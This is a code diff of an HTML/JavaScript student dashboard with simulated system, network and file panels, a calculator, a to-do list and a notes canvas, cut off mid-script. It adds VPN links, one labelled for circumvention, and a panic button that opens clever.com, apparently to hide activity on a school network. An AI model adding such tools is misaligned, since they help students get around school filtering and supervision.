+        <h2>🔐 VPN & Proxy Services</h2>
         <div class="links-list">
-          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
-          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
-          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
-          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
+          <a href="https://www.expressvpn.com" target="_blank">ExpressVPN</a>
+          <a href="https://www.nordvpn.com" target="_blank">NordVPN</a>
+          <a href="https://www.surfshark.com" target="_blank">Surfshark</a>
+          <a href="https://www.protonvpn.com" target="_blank">ProtonVPN</a>
+          <a href="https://www.tunnelbear.com" target="_blank">TunnelBear</a>
+          <a href="https://www.psiphon3.com" target="_blank">Psiphon (Circumvention)</a>
         </div>
       </div>
 
       <!-- Gaming Panel -->
       <div id="gamingPanel" class="info-panel">
-        <h2><span class="icon">🎮</span> Gaming Websites</h2>
+        <h2>🎮 Gaming & Entertainment</h2>
         <div class="coming-soon">
-          COMING SOON
+          Access to gaming platforms is restricted on the school network. Visit during personal time or use permitted devices.
         </div>
       </div>
 
       <!-- Music Panel -->
       <div id="musicPanel" class="info-panel">
-        <h2><span class="icon">🎵</span> Music Websites</h2>
+        <h2>🎵 Music & Audio Streaming</h2>
         <div class="coming-soon">
-          COMING SOON
+          Access to music streaming services is restricted on the school network. Please refer to allowed educational audio resources.
         </div>
       </div>
 
       <!-- Keyboard Panel -->
       <div id="keyboardPanel" class="info-panel">
-        <h2><span class="icon">🎹</span> Keyboard Tricks</h2>
+        <h2>🎹 Keyboard Shortcuts & Tricks</h2>
         <div class="info-text">
-          <p>System Shortcuts:
-• Access Spotlight Search: Press Command (⌘) + Space bar.
-• Return to the Home screen: Press Command (⌘) + H.
-• Show the Dock: Press Command (⌘) + Option (⌥) + D.
-• Show the App Library: Press Shift (⇧) + Globe + A.
-• Open Quick Note: Press Globe + Q.
-• Open Siri: Press Globe + S.
-• Open Control Center: Press Globe + C.
-• Open Notification Center: Press Globe + N.
-• Show all windows: Press Globe + Down Arrow.
-• Open the App Switcher: Press Globe + Up Arrow.
-Multitasking Shortcuts:
-• Switch to the last active app: Press Command (⌘) + Tab.
-• View all active apps: Press and hold Command (⌘) + Tab.
-• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
-• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
-• Open Slide Over: Press Globe + Backslash.
-• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
-Safari and App-Specific Shortcuts:
-• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
-• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
-• Open a new private tab: Press Command (⌘) + Shift + N.
-• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
-• Close the current tab: Press Command (⌘) + W.
-• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
-• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
-• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
-• Reopen the last closed tab: Press Shift + Command (⌘) + T.
-• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
-• Go to the last tab: Press Command (⌘) + 9.
-• Open the Tab Grid: Press Shift + Command (⌘) + .
-• Open a new Incognito tab: Press Shift + Command (⌘) + N.
-• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
-• Open a new window: Press Option (⌥) + Command (⌘) + N.
-General Navigation and Text Editing:
-• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
-• Select all text: Press Command (⌘) + A.
-• Copy selected text: Press Command (⌘) + C.
-• Cut selected text: Press Command (⌘) + X.
-• Paste copied text: Press Command (⌘) + V.
-• Undo the last action: Press Command (⌘) + Z.
-• Redo the last undone action: Press Command (⌘) + Shift + Z.
-• Jump to the top of a page: Press Command (⌘) + Up Arrow.
-• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
-• Highlight text one character at a time: Press Shift + Left or Right Arrow.
-To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
+          <p><strong>System Navigation:</strong>
+          • Spotlight Search: ⌘ + Space
+          • Return Home: ⌘ + H
+          • Show Dock: ⌘ + Option + D
+          • App Library: Shift + Globe + A
+          • Quick Note: Globe + Q
+          • Siri: Globe + S
+          • Control Center: Globe + C
+          • Notification Center: Globe + N
+          • Show All Windows: Globe + Down Arrow
+          • App Switcher: Globe + Up Arrow
+          <strong>Multitasking:</strong>
+          • Switch Apps: ⌘ + Tab
+          • Split View: Control + Globe + Left/Right Arrow
+          • Slide Over: Globe + Backslash
+          <strong>Safari & Apps:</strong>
+          • New Private Tab: ⌘ + Shift + N
+          • New Tab: ⌘ + T
+          • Close Tab: ⌘ + W
+          • Reopen Last Tab: Shift + ⌘ + T
+          • Next/Previous Tab: Option + ⌘ + Right/Left Arrow
+          • Tab Grid: Shift + ⌘ + .
+          <strong>Text Editing:</strong>
+          • Select All: ⌘ + A
+          • Copy: ⌘ + C
+          • Cut: ⌘ + X
+          • Paste: ⌘ + V
+          • Undo: ⌘ + Z
+          • Redo: ⌘ + Shift + Z
+          To view all shortcuts, press and hold the ⌘ key or consult the specific application's help menu.</p>
         </div>
       </div>
-
-      <!-- NEW PANELS FOR ENHANCED FUNCTIONALITY -->
 
       <!-- System Monitor Panel -->
-      <div id="systemStatusPanel" class="info-panel">
-        <h2><span class="icon">💻</span> System Status</h2>
-        <div class="status-grid">
-          <div class="status-item">
-            <div class="status-label">CPU Usage:</div>
-            <div class="status-value"><span id="simulatedCpu">0</span>%</div>
-            <div class="progress-bar-container"><div class="progress-bar" id="cpuProgressBar"></div></div>
+      <div id="systemMonitorPanel" class="info-panel">
+        <h2>📊 System Monitor</h2>
+        <div class="box-content">
+          <div class="stat-row header">
+            <div>Metric</div>
+            <div>Value</div>
+            <div>Status</div>
           </div>
-          <div class="status-item">
-            <div class="status-label">RAM Usage:</div>
-            <div class="status-value"><span id="simulatedRam">0</span> GB / <span id="totalRam">8</span> GB</div>
-            <div class="progress-bar-container"><div class="progress-bar" id="ramProgressBar"></div></div>
+          <div class="stat-row">
+            <div>CPU Usage</div>
+            <div class="progress-bar-container"><div class="progress-bar" id="cpuProgressBar" style="width: 50%;"></div></div>
+            <div class="value" id="cpuStatus">50%</div>
           </div>
-          <div class="status-item">
-            <div class="status-label">Disk Usage:</div>
-            <div class="status-value"><span id="simulatedDisk">0</span> GB / <span id="totalDisk">256</span> GB</div>
-            <div class="progress-bar-container"><div class="progress-bar" id="diskProgressBar"></div></div>
+          <div class="stat-row">
+            <div>RAM Usage</div>
+            <div class="progress-bar-container"><div class="progress-bar medium" id="ramProgressBar" style="width: 75%;"></div></div>
+            <div class="value" id="ramStatus">75%</div>
+          </div>
+          <div class="stat-row">
+            <div>Disk Usage</div>
+            <div class="progress-bar-container"><div class="progress-bar high" id="diskProgressBar" style="width: 85%;"></div></div>
+            <div class="value" id="diskStatus">85%</div>
+          </div>
+          <div class="stat-row">
+            <div>Uptime</div>
+            <div class="value" id="uptimeValueStat">--:--:--</div>
+            <div>Active</div>
+          </div>
+          <div class="stat-row">
+            <div>Network Speed</div>
+            <div class="value" id="networkSpeedValueStat">-- Mbps</div>
+            <div>Stable</div>
+          </div>
+          <div class="stat-row">
+            <div>System Load</div>
+            <div class="value">Low</div>
+            <div>Nominal</div>
           </div>
         </div>
       </div>
 
-      <!-- Network Monitor Panel -->
-      <div id="networkStatusPanel" class="info-panel">
-        <h2><span class="icon">🌐</span> Network Status</h2>
-        <div class="info-grid"> <!-- Re-using info-grid for alignment -->
-          <div class="info-item">
-            <div class="info-label">Download Speed:</div>
-            <div class="status-value"><span id="simulatedDownload">0</span> Mbps</div>
+      <!-- Network Tools Panel -->
+      <div id="networkToolsPanel" class="info-panel">
+        <h2><span id="networkToolTitle">🌐 Network Tools</span></h2>
+        <div class="box-content">
+          <div id="ipInfoSection">
+            <h3>Your IP Information</h3>
+            <div class="info-text">
+              <p><strong>Public IP Address:</strong> <span id="publicIp">Fetching...</span></p>
+              <p><strong>ISP:</strong> <span id="isp">Fetching...</span></p>
+              <p><strong>Location:</strong> <span id="location">Fetching...</span></p>
+            </div>
           </div>
-          <div class="info-item">
-            <div class="info-label">Upload Speed:</div>
-            <div class="status-value"><span id="simulatedUpload">0</span> Mbps</div>
+          <hr style="border-color: rgba(255,145,77,0.3); margin: 15px 0;">
+          <div id="pingSection">
+            <h3>Ping Test</h3>
+            <input type="text" id="pingTarget" placeholder="Enter domain or IP (e.g., google.com)" style="width: calc(100% - 130px); margin-right: 10px;">
+            <button onclick="dashboard.simulatePing()" style="background: #ff914d; padding: 10px 18px; border-radius: 8px; border: none; cursor: pointer;">Ping</button>
+            <div id="pingResult" class="info-text" style="margin-top: 10px;">Enter a target to start pinging...</div>
           </div>
-          <div class="info-item">
-            <div class="info-label">Ping (Latency):</div>
-            <div class="status-value"><span id="simulatedPing">0</span> ms</div>
-          </div>
-          <div class="info-item">
-            <div class="info-label">Packet Loss:</div>
-            <div class="status-value"><span id="simulatedLoss">0</span>%</div>
+          <hr style="border-color: rgba(255,145,77,0.3); margin: 15px 0;">
+          <div id="tracerouteSection">
+            <h3>Traceroute Test</h3>
+            <input type="text" id="tracerouteTarget" placeholder="Enter domain or IP (e.g., google.com)" style="width: calc(100% - 130px); margin-right: 10px;">
+            <button onclick="dashboard.simulateTraceroute()" style="background: #ff914d; padding: 10px 18px; border-radius: 8px; border: none; cursor: pointer;">Trace</button>
+            <div id="tracerouteResult" class="info-text" style="margin-top: 10px;">Enter a target to start traceroute...</div>
           </div>
         </div>
-        <div class="coming-soon">Simulating real-time network data...</div>
-      </div>
-
-      <!-- File Explorer Panel -->
-      <div id="fileExplorerPanel" class="info-panel">
-        <h2><span class="icon">📁</span> File Explorer</h2>
-        <div class="file-explorer-container">
-          <ul id="fileTree">
-            <!-- File tree will be generated here by JavaScript -->
-          </ul>
-        </div>
-        <div class="coming-soon">Accessing simulated file system...</div>
       </div>
 
       <!-- Task Manager Panel -->
       <div id="taskManagerPanel" class="info-panel">
-        <h2><span class="icon">📈</span> Task Manager</h2>
-        <div class="task-list">
-          <!-- Tasks will be listed here -->
+        <h2>📋 Simulated Task Manager</h2>
+        <div class="box-content">
+          <div class="process-list-header stat-row header">
+            <div>Process Name</div>
+            <div>CPU Usage</div>
+            <div>Memory</div>
+            <div>Action</div>
+          </div>
+          <div id="processList">
+            <!-- Processes will be loaded here by JS -->
+          </div>
         </div>
-        <div class="coming-soon">Monitoring simulated processes...</div>
       </div>
 
-      <!-- System Information Panel -->
+      <!-- File Explorer Panel -->
+      <div id="fileExplorerPanel" class="info-panel">
+        <h2>📁 Simulated File Explorer</h2>
+        <div class="box-content">
+          <div class="info-text">
+            <p>Current Directory: /home/user/documents/</p>
+            <ul id="fileList">
+              <li><strong>Folders:</strong></li>
+              <li>📁 Projects</li>
+              <li>📁 Downloads</li>
+              <li>📁 School Work</li>
+              <hr style="border-color: rgba(255,145,77,0.3); margin: 5px 0;">
+              <li><strong>Files:</strong></li>
+              <li>📄 report_final.docx</li>
+              <li>📄 notes_meeting_01.txt</li>
+              <li>📄 budget_2024.xlsx</li>
+              <li>📄 presentation.pptx</li>
+            </ul>
+            <p><em>File operations (create, delete, move) are simulated.</em></p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Media Player Panel -->
+      <div id="mediaPlayerPanel" class="info-panel">
+        <h2>▶️ Media Player</h2>
+        <div class="box-content" style="align-items: center;">
+          <div id="mediaDisplay" style="background: #333; width: 90%; height: 150px; border-radius: 8px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; color: #aaa;">
+            No media loaded
+          </div>
+          <div class="controls" style="display: flex; gap: 15px; align-items: center;">
+            <button onclick="dashboard.mediaControl('prev')" style="background: none; border: none; font-size: 24px; cursor: pointer;">⏮️</button>
+            <button onclick="dashboard.mediaControl('playPause')" style="background: #ff914d; border: none; font-size: 30px; padding: 10px 15px; border-radius: 50%; cursor: pointer;">▶️</button>
+            <button onclick="dashboard.mediaControl('next')" style="background: none; border: none; font-size: 24px; cursor: pointer;">⏭️</button>
+          </div>
+          <div class="progress-bar-container" style="width: 80%; margin-top: 15px; height: 6px;">
+            <div class="progress-bar" id="mediaProgress" style="width: 0%;"></div>
+          </div>
+          <p id="mediaTitle" style="margin-top: 10px; font-size: 14px;">No Song Playing</p>
+        </div>
+      </div>
+      
+      <!-- Calculator Panel -->
+      <div id="calculatorPanel" class="info-panel">
+        <h2>🔢 Calculator</h2>
+        <div class="box-content">
+          <div class="calc-display" id="calcDisplay">0</div>
+          <div class="calc-grid">
+            <button onclick="dashboard.calculator('AC')" class="clear">AC</button>
+            <button onclick="dashboard.calculator('DEL')" class="clear">DEL</button>
+            <button onclick="dashboard.calculator('/')" class="operator">/</button>
+            <button onclick="dashboard.calculator('*')" class="operator">*</button>
+            <button onclick="dashboard.calculator('7')">7</button>
+            <button onclick="dashboard.calculator('8')">8</button>
+            <button onclick="dashboard.calculator('9')">9</button>
+            <button onclick="dashboard.calculator('-')" class="operator">-</button>
+            <button onclick="dashboard.calculator('4')">4</button>
+            <button onclick="dashboard.calculator('5')">5</button>
+            <button onclick="dashboard.calculator('6')">6</button>
+            <button onclick="dashboard.calculator('+')" class="operator">+</button>
+            <button onclick="dashboard.calculator('1')">1</button>
+            <button onclick="dashboard.calculator('2')">2</button>
+            <button onclick="dashboard.calculator('3')">3</button>
+            <button onclick="dashboard.calculator('=')" class="equals">=</button>
+            <button onclick="dashboard.calculator('0')" style="grid-column: span 2;">0</button>
+            <button onclick="dashboard.calculator('.')">.</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- To-Do List Panel -->
+      <div id="todoPanel" class="info-panel">
+        <h2>📝 To-Do List</h2>
+        <div class="box-content">
+          <div style="display: flex; margin-bottom: 15px;">
+            <input type="text" id="todoInput" placeholder="Add a new task...">
+            <button id="addTodoBtn">Add</button>
+          </div>
+          <ul id="todoList" class="todo-list">
+            <!-- To-do items will be added here -->
+          </ul>
+        </div>
+      </div>
+
+      <!-- Preferences Panel -->
+      <div id="preferencesPanel" class="info-panel">
+        <h2>⚙️ User Preferences</h2>
+        <div class="box-content">
+          <div class="info-text">
+            <p><strong>Theme Settings:</strong></p>
+            <label>
+              <input type="checkbox" id="autoThemeToggle" onchange="dashboard.toggleAutoTheme()"> Auto Theme (Sync with System)
+            </label>
+            <p style="font-size: 12px; color: #ccc;">(System theme sync is simulated)</p>
+            
+            <p><strong>Dashboard Layout:</strong></p>
+            <button onclick="dashboard.resetLayout()" style="background: #ff914d; padding: 10px 18px; border-radius: 8px; border: none; cursor: pointer;">Reset Layout</button>
+            <p style="font-size: 12px; color: #ccc;">(Resets panel visibility and order - simulated)</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- System Info Panel -->
       <div id="systemInfoPanel" class="info-panel">
-        <h2><span class="icon">⚙️</span> System Information</h2>
-        <div class="info-grid">
-          <div class="info-item">
-            <div class="info-label">Operating System:</div>
-            <div class="info-value">Windows 11 Pro (Simulated)</div>
-          </div>
-          <div class="info-item">
-            <div class="info-label">OS Version:</div>
-            <div class="info-value">10.0.22621 (Simulated)</div>
-          </div>
-          <div class="info-item">
-            <div class="info-label">Architecture:</div>
-            <div class="info-value">x64 (Simulated)</div>
-          </div>
-          <div class="info-item">
-            <div class="info-label">Hostname:</div>
-            <div class="info-value">DESKTOP-ABCDEF (Simulated)</div>
-          </div>
-          <div class="info-item">
-            <div class="info-label">Kernel Version:</div>
-            <div class="info-value">10.0.22621.1992 (Simulated)</div>
-          </div>
-          <div class="info-item">
-            <div class="info-label">User Name:</div>
-            <div class="info-value" id="sysInfoUserName">N/A</div>
+        <h2>ℹ️ System Information</h2>
+        <div class="box-content">
+          <div class="sys-info-details" id="sysInfoDetails">
+            <p><strong>Hostname:</strong> <span id="sysHostname">DESKTOP-ABC123</span></p>
+            <p><strong>OS Platform:</strong> <span id="sysOS">Windows 10 Pro</span></p>
+            <p><strong>Architecture:</strong> <span id="sysArch">x64</span></p>
+            <p><strong>CPU Cores:</strong> <span id="sysCPUCores">8</span></p>
+            <p><strong>RAM:</strong> <span id="sysRAM">16 GB</span></p>
+            <p><strong>GPU:</strong> <span id="sysGPU">NVIDIA GeForce RTX 3070</span></p>
+            <p><strong>Browser:</strong> <span id="sysBrowser">Chrome 110</span></p>
+            <p><strong>User Agent:</strong> <span id="sysUserAgent">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span></p>
+            <p><strong>Screen Resolution:</strong> <span id="sysScreenRes">1920x1080</span></p>
+            <p><strong>Language:</strong> <span id="sysLang">en-US</span></p>
+            <p><strong>Timezone:</strong> <span id="sysTimezone">America/New_York</span></p>
           </div>
         </div>
       </div>
-
-      <!-- END NEW PANELS -->
 
     </div>
 
@@ -1291,6 +1764,7 @@ To view all available shortcuts for the specific app you are using, press and h
   <script>
     // Dashboard functionality object
     const dashboard = {
+      isPanelVisible: {}, // To track visibility of panels
       // Initialize all dashboard functionality
       init: function() {
         this.initSessionTimer();
@@ -1301,12 +1775,15 @@ To view all available shortcuts for the specific app you are using, press and h
         this.initCanvas();
         this.initPanels();
         this.initQuickBar();
-        // Initialize new simulated features
-        this.initSystemMonitor();
-        this.initNetworkMonitor();
-        this.initFileExplorer();
-        this.initTaskManager();
-        this.initSystemInfo();
+        this.initSystemMonitors(); // Initialize new monitors
+        this.initNetworkTools();   // Initialize new network tools
+        this.initTaskManager();    // Initialize task manager
+        this.initFileExplorer();   // Initialize file explorer
+        this.initMediaPlayer();    // Initialize media player
+        this.initCalculator();     // Initialize calculator
+        this.initTodoList();       // Initialize to-do list
+        this.initPreferences();    // Initialize preferences
+        this.initSystemInfo();     // Initialize system info
       },
       
       // Initialize session timer
@@ -1322,12 +1799,12 @@ To view all available shortcuts for the specific app you are using, press and h
         function updateSessionTime() {
           sessionSeconds++;
           document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
+          document.getElementById('uptimeValue').innerText = formatTime(sessionSeconds); // Update uptime button
+          document.getElementById('uptimeValueStat').innerText = formatTime(sessionSeconds); // Update system monitor
         }
         
-        // Update immediately on init
         updateSessionTime();
-        // Update every second
-        setInterval(updateSessionTime, 1000);
+        this.sessionTimerInterval = setInterval(updateSessionTime, 1000);
       },
       
       // Initialize real-time clock
@@ -1342,19 +1819,15 @@ To view all available shortcuts for the specific app you are using, press and h
           document.getElementById('realDate').innerText = '📅 ' + dateStr;
         }
         
-        // Update immediately on init
         updateClock();
-        // Update every second
-        setInterval(updateClock, 1000);
+        this.clockInterval = setInterval(updateClock, 1000);
       },
       
       // Generate calendar
       generateCalendar: function() {
         const calendar = document.getElementById('calendar');
-        calendar.innerHTML = ''; // Clear previous content
+        calendar.innerHTML = ''; 
         const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-        
-        // Add day headers
         days.forEach(day => {
           const div = document.createElement('div');
           div.innerText = day;
@@ -1366,22 +1839,31 @@ To view all available shortcuts for the specific app you are using, press and h
         const month = date.getMonth();
         const today = date.getDate();
 
-        const firstDayOfMonth = new Date(year, month, 1).getDay(); // 0 for Sunday, 1 for Monday, etc.
-        const daysInMonth = new Date(year, month + 1, 0).getDate();
+        const firstDay = new Date(year, month, 1).getDay();
+        const lastDate = new Date(year, month + 1, 0).getDate();
 
-        // Add empty cells for days before the first day of the month
-        for (let i = 0; i < firstDayOfMonth; i++) {
+        // Add empty cells for days before the 1st of the month
+        for (let i = 0; i < firstDay; i++) {
           const empty = document.createElement('div');
+          empty.style.visibility = 'hidden'; // Make empty cells invisible
           calendar.appendChild(empty);
         }
 
-        // Add cells for each day of the month
-        for (let i = 1; i <= daysInMonth; i++) {
+        // Add day cells
+        for (let i = 1; i <= lastDate; i++) {
           const cell = document.createElement('div');
           cell.innerText = i;
-          if (i === today) cell.classList.add('today'); // Mark today's date
+          if (i === today) cell.classList.add('today');
+          cell.onclick = () => this.selectDate(year, month, i); // Add date selection handler
           calendar.appendChild(cell);
         }
+      },
+
+      selectDate: function(year, month, day) {
+        const formattedDate = `${year}-${String(month + 1).padStart(2, '0')}-${String(day).padStart(2, '0')}`;
+        console.log("Date selected:", formattedDate);
+        // Optionally, display this date somewhere or trigger an action
+        // For now, just logging.
       },
       
       // Initialize theme toggle
@@ -1390,25 +1872,28 @@ To view all available shortcuts for the specific app you are using, press and h
         themeBtn.addEventListener('click', () => {
           document.body.classList.toggle('light-theme');
           if(document.body.classList.contains('light-theme')){
-            themeBtn.innerHTML = '☀️ Light Mode'; // Use innerHTML for emoji support
+            themeBtn.innerHTML = '☀️ Light Mode';
           } else {
             themeBtn.innerHTML = '🌙 Dark Mode';
           }
         });
       },
       
-      // Initialize various buttons like Panic, Restart, etc.
+      // Initialize buttons (existing ones)
       initButtons: function() {
         document.getElementById('panicBtn').addEventListener('click', () => {
-          // Opens a new tab with a specific website
-          window.open('https://clever.com', '_blank');
+          window.open('https://clever.com', '_blank'); // Keep existing functionality
         });
 
         document.getElementById('restartBtn').addEventListener('click', () => {
-          if(confirm('Are you sure you want to simulate a page restart? This will reset the dashboard.')) {
-            // Replaces the entire body content to simulate a restart
-            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Refresh to continue.</div>`;
-            // A real page restart would involve window.location.reload();
+          if(confirm('Are you sure you want to kill the page (restart)?')) {
+            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
+            // Clear intervals to prevent them from running on a killed page
+            clearInterval(this.sessionTimerInterval);
+            clearInterval(this.clockInterval);
+            clearInterval(this.systemMonitorInterval);
+            clearInterval(this.networkSpeedInterval);
+            clearInterval(this.processUpdateInterval);
           }
         });
 
@@ -1418,12 +1903,10 @@ To view all available shortcuts for the specific app you are using, press and h
         
         document.getElementById('fullScreenBtn').addEventListener('click', () => {
           if (!document.fullscreenElement) {
-            // Request full screen mode for the element
             document.documentElement.requestFullscreen().catch(err => {
               alert(`Error attempting to enable full-screen mode: ${err.message}`);
             });
           } else {
-            // Exit full screen mode
             document.exitFullscreen();
           }
         });
@@ -1446,31 +1929,48 @@ To view all available shortcuts for the specific app you are using, press and h
             document.body.style.zoom = zoomLevel;
           }
         });
+
+        document.getElementById('logoutBtn').addEventListener('click', () => {
+          if (confirm('Are you sure you want to log out?')) {
+            window.location.reload(); // Simple logout by refreshing the page
+          }
+        });
       },
       
-      // Initialize canvas for notes
+      // Initialize canvas (notes)
       initCanvas: function() {
         const notesBtn = document.getElementById('notesBtn');
         const canvasContainer = document.getElementById('canvasContainer');
-        const mainGrid = document.getElementById('mainGrid'); // The main content area
-        const announcementBar = document.getElementById('announcementBar'); // Also hide announcement
+        const mainGrid = document.getElementById('mainGrid');
+        const toggleBtn = document.getElementById('toggleSectionsBtn'); // Re-reference for animation
 
         notesBtn.addEventListener('click', () => {
-          mainGrid.style.display = 'none'; // Hide main content
-          announcementBar.style.display = 'none'; // Hide announcement
-          canvasContainer.style.display = 'block'; // Show canvas container
-          notesBtn.style.display = 'none'; // Hide the notes button itself
-          document.getElementById('exportNotesBtn').style.display = 'none'; // Hide export button
-          document.getElementById('screenshotBtn').style.display = 'none'; // Hide screenshot button
+          mainGrid.style.display = 'none';
+          canvasContainer.style.display = 'block';
+          // Animate canvas container in
+          canvasContainer.style.opacity = 0;
+          canvasContainer.style.transform = 'translateY(20px)';
+          requestAnimationFrame(() => {
+            canvasContainer.style.transition = 'opacity 0.5s ease-out, transform 0.5s ease-out';
+            canvasContainer.style.opacity = 1;
+            canvasContainer.style.transform = 'translateY(0)';
+          });
+          toggleBtn.innerText = '⬆️ Toggle Sections'; // Reset toggle text
+          mainGrid.style.display = 'none'; // Hide main grid explicitly
         });
 
         document.getElementById('closeCanvasBtn').addEventListener('click', () => {
-          canvasContainer.style.display = 'none'; // Hide canvas container
-          mainGrid.style.display = 'flex'; // Show main content
-          announcementBar.style.display = 'block'; // Show announcement
-          notesBtn.style.display = 'block'; // Show the notes button
-          document.getElementById('exportNotesBtn').style.display = 'block'; // Show export button
-          document.getElementById('screenshotBtn').style.display = 'block'; // Show screenshot button
+          canvasContainer.style.display = 'none';
+          mainGrid.style.display = 'flex';
+          // Animate main grid in
+          mainGrid.style.opacity = 0;
+          mainGrid.style.transform = 'translateY(30px)';
+          requestAnimationFrame(() => {
+            mainGrid.style.transition = 'opacity 0.8s ease-out 0.5s, transform 0.8s ease-out 0.5s'; // Staggered entry
+            mainGrid.style.opacity = 1;
+            mainGrid.style.transform = 'translateY(0)';
+          });
+          toggleBtn.innerText = '⬆️ Toggle Sections'; // Reset toggle text
         });
 
         const clearCanvasBtn = document.getElementById('clearCanvasBtn');
@@ -1478,502 +1978,654 @@ To view all available shortcuts for the specific app you are using, press and h
         const canvas = document.getElementById('notesCanvas');
         const ctx = canvas.getContext('2d');
 
-        // Initialize canvas with a white background
-        ctx.fillStyle = '#fff';
+        ctx.fillStyle = '#fff'; // Default background
         ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-        let drawing = false; // Flag to track if drawing is in progress
+        let drawing = false;
+        let lastPos = { x: 0, y: 0 };
 
-        // Helper to get mouse/touch position relative to canvas
         function getPos(evt) {
           const rect = canvas.getBoundingClientRect();
-          // Use touch event if available, otherwise mouse event
-          const clientX = evt.clientX || (evt.touches && evt.touches[0].clientX);
-          const clientY = evt.clientY || (evt.touches && evt.touches[0].clientY);
-          
+          const clientX = evt.touches ? evt.touches[0].clientX : evt.clientX;
+          const clientY = evt.touches ? evt.touches[0].clientY : evt.clientY;
           return {
             x: clientX - rect.left,
             y: clientY - rect.top
           };
         }
 
-        // Event listener for starting drawing (mousedown or touchstart)
-        canvas.addEventListener('mousedown', (e) => {
+        function startDrawing(e) {
           drawing = true;
-          const pos = getPos(e);
-          ctx.beginPath(); // Start a new path
-          ctx.moveTo(pos.x, pos.y); // Move to the starting point
-          e.preventDefault(); // Prevent default browser behavior (like text selection)
-        });
-
-        canvas.addEventListener('touchstart', (e) => {
-          drawing = true;
-          const pos = getPos(e);
+          lastPos = getPos(e);
           ctx.beginPath();
-          ctx.moveTo(pos.x, pos.y);
+          ctx.moveTo(lastPos.x, lastPos.y);
           e.preventDefault();
-        });
+        }
 
-        // Event listener for drawing (mousemove or touchmove)
-        canvas.addEventListener('mousemove', (e) => {
-          if (!drawing) return; // Only draw if drawing is active
-          const pos = getPos(e);
-          ctx.lineTo(pos.x, pos.y); // Add a line to the current point
-          ctx.strokeStyle = '#ff914d'; // Set line color
-          ctx.lineWidth = 2; // Set line width
-          ctx.lineCap = 'round'; // Make line endings rounded
-          ctx.stroke(); // Draw the line
-          e.preventDefault();
-        });
-
-        canvas.addEventListener('touchmove', (e) => {
+        function draw(e) {
           if (!drawing) return;
           const pos = getPos(e);
           ctx.lineTo(pos.x, pos.y);
-          ctx.strokeStyle = '#ff914d';
-          ctx.lineWidth = 2;
+          ctx.strokeStyle = '#ff914d'; // Accent color
+          ctx.lineWidth = 3; // Slightly thicker line
           ctx.lineCap = 'round';
+          ctx.lineJoin = 'round';
           ctx.stroke();
+          lastPos = pos;
           e.preventDefault();
-        });
+        }
 
-        // Event listener for stopping drawing (mouseup, mouseleave, touchend, touchcancel)
-        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
-          canvas.addEventListener(evtName, () => {
-            drawing = false; // Stop drawing when mouse button is released or touch ends
-          });
-        });
+        function stopDrawing() {
+          drawing = false;
+        }
 
-        // Event listener for clearing the canvas
+        canvas.addEventListener('mousedown', startDrawing);
+        canvas.addEventListener('touchstart', startDrawing);
+
+        canvas.addEventListener('mousemove', draw);
+        canvas.addEventListener('touchmove', draw);
+
+        canvas.addEventListener('mouseup', stopDrawing);
+        canvas.addEventListener('mouseleave', stopDrawing);
+        canvas.addEventListener('touchend', stopDrawing);
+        canvas.addEventListener('touchcancel', stopDrawing);
+
         clearCanvasBtn.addEventListener('click', () => {
-          ctx.clearRect(0, 0, canvas.width, canvas.height); // Clear the entire canvas
-          ctx.fillStyle = '#fff'; // Reset fill style
-          ctx.fillRect(0, 0, canvas.width, canvas.height); // Refill with white background
-          // Log the action
-          this.logSystemActivity('Canvas Cleared');
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+          ctx.fillStyle = '#fff';
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
         });
 
-        // Event listener for taking a screenshot of the dashboard
         document.getElementById('screenshotBtn').addEventListener('click', () => {
-          const elementToCapture = document.body; // Capture the entire body
+          const elementToCapture = document.body; 
           html2canvas(elementToCapture).then(canvasImg => {
             const link = document.createElement('a');
-            link.download = 'dashboard_screenshot.png'; // Filename for download
-            link.href = canvasImg.toDataURL('image/png'); // Convert canvas to data URL
-            link.click(); // Programmatically click the link to trigger download
-            // Log the action
-            this.logSystemActivity('Dashboard Screenshot Taken');
+            link.download = 'dashboard_screenshot.png';
+            link.href = canvasImg.toDataURL('image/png');
+            link.click();
           });
         });
         
-        // Event listener for exporting the notes canvas
         document.getElementById('exportNotesBtn').addEventListener('click', () => {
           const link = document.createElement('a');
-          link.download = 'notes_canvas.png'; // Filename for download
